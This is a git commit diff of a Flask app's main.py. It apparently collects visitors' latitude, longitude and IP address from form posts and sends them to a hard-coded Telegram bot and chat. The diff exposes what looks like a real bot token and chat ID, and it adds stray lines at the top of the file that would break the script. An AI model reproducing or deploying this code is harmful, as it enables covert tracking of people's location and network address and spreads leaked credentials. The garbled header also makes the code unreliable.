4f72b2b4a1021f17328376aafb23b6e72d01d9ae
gowano2022 <59827733+gowano2022@users.noreply.github.com>
2023-06-24 17:22:11 +0300

    Update main.py

--- main.py
+++ main.py
@@ -1,3 +1,9 @@
+localipy
+373715044
+5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg
+
+
+
 from flask import Flask, render_template, request
 import requests
 
@@ -11,22 +17,11 @@ def hello():
 def send_location():
     latitude = request.form['latitude']
     longitude = request.form['longitude']
-
-        # Get the IP address of the user
-    ip_address = request.form['ip_address']
-
     
     # Send the location to Telegram using the Telegram Bot API
     bot_token = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg'
     chat_id = '373715044'
     api_url = f"https://api.telegram.org/bot{bot_token}/sendLocation?chat_id={chat_id}&latitude={latitude}&longitude={longitude}"
-
-      # Send the IP address to Telegram using the Telegram Bot API
-    bot_token = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg'
-    chat_id = '373715044'
-    message = f"IP Address: {ip_address}"
-    api_url = f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text={message}"
-
     
     response = requests.get(api_url)
     if response.status_code == 200:
@@ -34,14 +29,22 @@ def send_location():
     else:
         return 'Failed to send location.'
 
-
-    response = requests.get(api_url2)
+@app.route('/send_ip', methods=['POST'])
+def send_ip():
+    # Get the IP address of the user
+    ip_address = request.form['ip_address']
+    
+    # Send the IP address to Telegram using the Telegram Bot API
+    bot_token = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg'
+    chat_id = '373715044'
+    message = f"IP Address: {ip_address}"
+    api_url = f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text={message}"
+    
+    response = requests.get(api_url)
     if response.status_code == 200:
         return 'IP sent successfully!'
     else:
         return 'Failed to send IP.'
-
-
 
 if __name__ == '__main__':
     app.run()
